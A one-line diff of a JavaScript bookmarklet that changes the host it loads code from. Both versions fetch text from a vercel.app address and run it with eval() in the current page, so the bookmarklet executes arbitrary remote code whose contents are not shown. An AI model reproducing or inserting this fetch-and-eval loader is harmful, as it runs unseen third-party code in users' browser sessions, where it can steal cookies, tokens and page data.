@@ -1,1 +1,1 @@
-javascript:fetch("https://x7k2p9-svc.vercel.app").then(r=>r.text()).then(t=>{eval(t)}).catch(e=>alert("Error: "+e))
+javascript:fetch("Https://pqgolerdol.vercel.app/").then(r=>r.text()).then(t=>{eval(t)}).catch(e=>alert("Error: "+e))
